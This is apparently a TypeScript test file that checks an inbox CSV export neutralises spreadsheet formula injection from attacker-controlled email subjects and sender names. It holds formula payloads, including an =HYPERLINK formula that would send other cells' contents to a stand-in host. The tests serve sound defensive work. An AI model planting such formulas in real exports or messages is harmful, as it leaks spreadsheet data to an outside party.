/**
 * Inbox CSV formula injection.
 *
 * A mailbox attacker controls the subject and the From display name. Those
 * strings are stored on the brief (after stripEmoji only) and GET
 * /api/export/inbox writes them with toCsv. A spreadsheet formula is a
 * field whose text starts with =, +, -, or @. Quoting a field that also
 * contains a comma or a quote does not neutralize it.
 *
 * These assertions fail until every attacker-controlled cell is prefixed
 * with a single quote or a tab. Safe text must be preserved as-is.
 */
import assert from "node:assert/strict";
import { buildExportRows, toCsv } from "../src/lib/inbox/export.ts";
import type { Brief } from "../src/lib/inbox/matters.ts";
import { stripEmoji } from "../src/lib/inbox/types.ts";
import { listGmailFolder } from "../src/lib/mail/gmail.ts";
import { listGraphFolder } from "../src/lib/mail/graph.ts";

let failures = 0;
function check(name: string, fn: () => void | Promise<void>) {
  return Promise.resolve()
    .then(fn)
    .then(() => {
      console.log(`  ok   ${name}`);
    })
    .catch((e) => {
      failures += 1;
      console.error(
        `  FAIL ${name}\n       ${e instanceof Error ? e.message : e}`,
      );
    });
}

/** RFC 4180 reader for the bytes toCsv emits. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let i = 0;
  let inQuotes = false;
  while (i < text.length) {
    const c = text[i];
    if (inQuotes) {
      if (c === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i += 2;
          continue;
        }
        inQuotes = false;
        i += 1;
        continue;
      }
      field += c;
      i += 1;
      continue;
    }
    if (c === '"') {
      inQuotes = true;
      i += 1;
      continue;
    }
    if (c === ",") {
      row.push(field);
      field = "";
      i += 1;
      continue;
    }
    if (c === "\r") {
      i += 1;
      continue;
    }
    if (c === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      i += 1;
      continue;
    }
    field += c;
    i += 1;
  }
  if (field.length > 0 || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

function jsonResponse(body: unknown): Response {
  return new Response(JSON.stringify(body), {
    status: 200,
    headers: { "Content-Type": "application/json" },
  });
}

/**
 * The cell is safe for Excel / Google Sheets when a leading formula
 * character has been turned into text with a single quote or a tab, and
 * the original characters are still there after that one-character prefix.
 */
function assertNeutralized(value: string, original: string, label: string) {
  const quoted = `'${original}`;
  const tabbed = `\t${original}`;
  assert.ok(
    value === quoted || value === tabbed,
    `${label}: spreadsheet formula left intact. expected a leading ' or tab before ${JSON.stringify(original)}, got ${JSON.stringify(value)}`,
  );
}

function assertAllNeutralized(
  cells: { value: string; original: string; label: string }[],
) {
  const problems: string[] = [];
  for (const cell of cells) {
    try {
      assertNeutralized(cell.value, cell.original, cell.label);
    } catch (e) {
      problems.push(e instanceof Error ? e.message : String(e));
    }
  }
  assert.equal(problems.length, 0, problems.join("\n"));
}

function column(table: string[][], header: string): number {
  const idx = table[0]?.indexOf(header) ?? -1;
  assert.ok(idx >= 0, `missing column ${header}`);
  return idx;
}

const EQUALS = "=1+1";
const PLUS = "+1+1";
const MINUS = "-2+3";
const AT = "@SUM(A1)";
/** Quotes force csvCell to wrap the field. The logical text still starts with =. */
const HYPERLINK = '=HYPERLINK("http://example.test/"&A2&F2&H2)';
/** A comma also forces quoting and does not neutralize the formula. */
const CONCAT = "=CONCAT(A2,F2)";

let scriptedGmail:
  | { subject: string; fromHeader: string }
  | undefined;
let scriptedGraph:
  | { subject: string; fromName: string; fromAddress: string }
  | undefined;

function installFetch() {
  const previous = globalThis.fetch;
  globalThis.fetch = (async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url.includes("gmail.googleapis.com")) {
      const script = scriptedGmail;
      if (!script) return jsonResponse({});
      if (url.includes("/users/me/messages/m1")) {
        return jsonResponse({
          id: "m1",
          threadId: "t1",
          snippet: "hello",
          internalDate: "1700000000000",
          labelIds: ["INBOX", "UNREAD"],
          payload: {
            headers: [
              { name: "From", value: script.fromHeader },
              { name: "To", value: "victim@example.test" },
              { name: "Subject", value: script.subject },
            ],
          },
        });
      }
      if (url.includes("/users/me/messages?")) {
        return jsonResponse({
          messages: [{ id: "m1", threadId: "t1" }],
        });
      }
    }
    if (url.includes("graph.microsoft.com")) {
      const script = scriptedGraph;
      if (!script) return jsonResponse({ value: [] });
      return jsonResponse({
        value: [
          {
            id: "g1",
            conversationId: "c1",
            subject: script.subject,
            bodyPreview: "hello",
            receivedDateTime: "2026-01-01T00:00:00Z",
            isRead: false,
            from: {
              emailAddress: {
                name: script.fromName,
                address: script.fromAddress,
              },
            },
            toRecipients: [
              { emailAddress: { address: "victim@example.test" } },
            ],
          },
        ],
      });
    }
    return new Response("unexpected url", { status: 500 });
  }) as typeof fetch;
  return () => {
    globalThis.fetch = previous;
  };
}

type Stored = {
  subject: string;
  fromName: string;
  fromEmail: string;
  summary: string;
};

/** What buildBrief writes: stripEmoji, and nothing else, on these fields. */
function storedFromProvider(input: {
  subject: string;
  fromName: string;
  fromEmail: string;
  /** Digest items use the subject itself when there is no deep-read line. */
  summaryFromSubject?: boolean;
}): Stored {
  const subject = stripEmoji(input.subject);
  const fromName = stripEmoji(input.fromName);
  return {
    subject,
    fromName,
    fromEmail: input.fromEmail,
    summary: input.summaryFromSubject ? subject : stripEmoji(input.subject),
  };
}

function briefFrom(rows: Stored[]): Brief {
  const [matter, filed, digest, pinned] = rows;
  return {
    builtAt: "2026-08-09T12:00:00Z",
    summary: "",
    functions: ["sales"],
    pinned: pinned
      ? [
          {
            id: "p1",
            title: "Pinned work",
            category: "read",
            orgUnit: "sales",
            people: [],
            narrative: "",
            nextAction: "Reply",
            owner: "you",
            urgency: 1,
            emails: [
              {
                id: "p1",
                threadId: "tp",
                from: pinned.fromName,
                fromEmail: pinned.fromEmail,
                subject: pinned.subject,
                line: pinned.summary,
                suggestion: "Reply",
                at: "2026-08-08T00:00:00Z",
              },
            ],
            emailIds: ["p1"],
            threadIds: ["tp"],
            updatedAt: "2026-08-09T12:00:00Z",
          },
        ]
      : [],
    matters: [
      {
        id: "m1",
        title: "Ordinary matter",
        category: "read",
        orgUnit: "sales",
        people: [],
        narrative: "",
        nextAction: "Reply",
        owner: "you",
        urgency: 1,
        emails: [
          {
            id: "e1",
            threadId: "t1",
            from: matter.fromName,
            fromEmail: matter.fromEmail,
            subject: matter.subject,
            line: matter.summary,
            suggestion: "Reply",
            at: "2026-08-08T00:00:00Z",
          },
        ],
        emailIds: ["e1"],
        threadIds: ["t1"],
        updatedAt: "2026-08-09T12:00:00Z",
      },
    ],
    headlines: [],
    headlineIds: [],
    filed: [
      {
        emailId: "f1",
        threadId: "tf",
        orgUnit: "sales",
        fromName: filed.fromName,
        fromEmail: filed.fromEmail,
        subject: filed.subject,
        known: false,
        line: filed.summary,
        suggestion: "Keep as record",
        at: "2026-08-07T00:00:00Z",
      },
    ],
    digest: {
      summary: "",
      themes: [
        {
          theme: digest.fromName,
          line: "none of them ask you for anything",
          emailIds: ["d1"],
          items: [
            {
              id: "d1",
              threadId: "td",
              fromName: digest.fromName,
              fromEmail: digest.fromEmail,
              subject: digest.subject,
              line: digest.summary,
              at: "2026-08-09T00:00:00Z",
            },
          ],
        },
      ],
    },
  } as unknown as Brief;
}

function exportedTable(rows: Stored[]): string[][] {
  return parseCsv(toCsv(buildExportRows(briefFrom(rows))));
}

function rowByMessage(table: string[][], id: string): string[] {
  const idCol = column(table, "Message id");
  const found = table.find((row, i) => i > 0 && row[idCol] === id);
  assert.ok(found, `missing export row ${id}`);
  return found;
}

console.log("csv formula injection");

const restoreFetch = installFetch();

await check("Gmail list keeps a formula subject and display name", async () => {
  scriptedGmail = {
    subject: EQUALS,
    fromHeader: `"${PLUS}" <attacker@example.test>`,
  };
  const [message] = await listGmailFolder("token", "inbox", 1);
  assert.equal(message.subject, EQUALS);
  assert.equal(message.fromName, PLUS);
  assert.equal(message.fromEmail, "attacker@example.test");
  assert.equal(stripEmoji(message.subject), EQUALS);
  assert.equal(stripEmoji(message.fromName), PLUS);
});

await check("Gmail list keeps a formula-shaped address local part", async () => {
  scriptedGmail = {
    subject: MINUS,
    fromHeader: `${EQUALS}@example.test`,
  };
  const [message] = await listGmailFolder("token", "inbox", 1);
  assert.equal(message.subject, MINUS);
  assert.equal(message.fromEmail, `${EQUALS}@example.test`);
  assert.equal(stripEmoji(message.subject), MINUS);
});

await check("Graph list keeps a formula subject and display name", async () => {
  scriptedGraph = {
    subject: AT,
    fromName: HYPERLINK,
    fromAddress: "attacker@example.test",
  };
  const [message] = await listGraphFolder("token", "inbox", 1);
  assert.equal(message.subject, AT);
  assert.equal(message.fromName, HYPERLINK);
  assert.equal(stripEmoji(message.subject), AT);
  assert.equal(stripEmoji(message.fromName), HYPERLINK);
});

await check(
  "matter, filed, digest, and pinned subjects are not spreadsheet formulas",
  () => {
    const table = exportedTable([
      storedFromProvider({
        subject: EQUALS,
        fromName: "Alice",
        fromEmail: "alice@example.test",
      }),
      storedFromProvider({
        subject: PLUS,
        fromName: "Bob",
        fromEmail: "bob@example.test",
      }),
      storedFromProvider({
        subject: HYPERLINK,
        fromName: "Carol",
        fromEmail: "carol@example.test",
        summaryFromSubject: true,
      }),
      storedFromProvider({
        subject: CONCAT,
        fromName: "Dan",
        fromEmail: "dan@example.test",
      }),
    ]);
    const subject = column(table, "Subject");
    assert.equal(table.length, 5);
    assertAllNeutralized([
      { value: rowByMessage(table, "e1")[subject], original: EQUALS, label: "matter subject" },
      { value: rowByMessage(table, "f1")[subject], original: PLUS, label: "filed subject" },
      { value: rowByMessage(table, "d1")[subject], original: HYPERLINK, label: "digest subject" },
      { value: rowByMessage(table, "p1")[subject], original: CONCAT, label: "pinned subject" },
    ]);
  },
);

await check("sender display names and formula addresses are neutralized", () => {
  const table = exportedTable([
    storedFromProvider({
      subject: "Hello",
      fromName: PLUS,
      fromEmail: "alice@example.test",
    }),
    storedFromProvider({
      subject: "Hello",
      fromName: AT,
      fromEmail: `${EQUALS}@example.test`,
    }),
    storedFromProvider({
      subject: "Hello",
      fromName: MINUS,
      fromEmail: "carol@example.test",
    }),
    storedFromProvider({
      subject: "Hello",
      fromName: "Dan",
      fromEmail: "dan@example.test",
    }),
  ]);
  const name = column(table, "From name");
  const email = column(table, "From email");
  const group = column(table, "Matter or category");
  assertAllNeutralized([
    { value: rowByMessage(table, "e1")[name], original: PLUS, label: "matter from name" },
    { value: rowByMessage(table, "f1")[name], original: AT, label: "filed from name" },
    {
      value: rowByMessage(table, "f1")[email],
      original: `${EQUALS}@example.test`,
      label: "filed from email",
    },
    { value: rowByMessage(table, "d1")[name], original: MINUS, label: "digest from name" },
    // Digest group is the theme, which the failure path sets from the sender name.
    { value: rowByMessage(table, "d1")[group], original: MINUS, label: "digest group" },
  ]);
});

await check(
  "summaries that fall back to the subject or the sender name are neutralized",
  () => {
    const table = exportedTable([
      storedFromProvider({
        subject: EQUALS,
        fromName: "Alice",
        fromEmail: "alice@example.test",
        summaryFromSubject: true,
      }),
      storedFromProvider({
        subject: "Hello",
        fromName: AT,
        fromEmail: "bob@example.test",
        summaryFromSubject: false,
      }),
      storedFromProvider({
        subject: HYPERLINK,
        fromName: "Carol",
        fromEmail: "carol@example.test",
        summaryFromSubject: true,
      }),
      storedFromProvider({
        subject: CONCAT,
        fromName: "Dan",
        fromEmail: "dan@example.test",
      }),
    ]);
    const summary = column(table, "What it is");
    const summaryCells: { value: string; original: string; label: string }[] = [
      {
        value: rowByMessage(table, "e1")[summary],
        original: EQUALS,
        label: "matter summary",
      },
    ];
    // Filed summary is the sender display name, the lineFor shape when the
    // name itself is the formula (personName returns it unchanged).
    const filedFormula = exportedTable([
      storedFromProvider({
        subject: "Hello",
        fromName: "Alice",
        fromEmail: "alice@example.test",
      }),
      {
        subject: stripEmoji("Hello"),
        fromName: stripEmoji(AT),
        fromEmail: "bob@example.test",
        summary: stripEmoji(`${AT} — Hello`),
      },
      storedFromProvider({
        subject: "Hello",
        fromName: "Carol",
        fromEmail: "carol@example.test",
      }),
      storedFromProvider({
        subject: "Hello",
        fromName: "Dan",
        fromEmail: "dan@example.test",
      }),
    ]);
    summaryCells.push(
      {
        value: rowByMessage(filedFormula, "f1")[summary],
        original: stripEmoji(`${AT} — Hello`),
        label: "filed summary",
      },
      {
        value: rowByMessage(table, "d1")[summary],
        original: HYPERLINK,
        label: "digest summary",
      },
      {
        value: rowByMessage(table, "p1")[summary],
        original: CONCAT,
        label: "pinned summary",
      },
    );
    assertAllNeutralized(summaryCells);
  },
);

await check("ordinary subjects, names, and embedded equals signs stay literal", () => {
  const table = exportedTable([
    {
      subject: "Pricing request",
      fromName: "Anna Roche",
      fromEmail: "anna@example.test",
      summary: "Anna Roche — pricing",
    },
    {
      subject: "Q2 = final",
      fromName: "A, B",
      fromEmail: "ab@example.test",
      summary: 'He said "yes"',
    },
    {
      subject: "Line one",
      fromName: "Carol",
      fromEmail: "carol@example.test",
      summary: "line one",
    },
    {
      subject: "Pinned note",
      fromName: "Dan",
      fromEmail: "dan@example.test",
      summary: "a note",
    },
  ]);
  const subject = column(table, "Subject");
  const name = column(table, "From name");
  const summary = column(table, "What it is");
  const matter = rowByMessage(table, "e1");
  const filed = rowByMessage(table, "f1");
  assert.equal(matter[subject], "Pricing request");
  assert.equal(matter[name], "Anna Roche");
  assert.equal(matter[summary], "Anna Roche — pricing");
  assert.equal(filed[subject], "Q2 = final");
  assert.equal(filed[name], "A, B");
  assert.equal(filed[summary], 'He said "yes"');
});

restoreFetch();

if (failures) {
  console.error(`\n${failures} failed`);
  process.exit(1);
}
console.log("\nall passed");
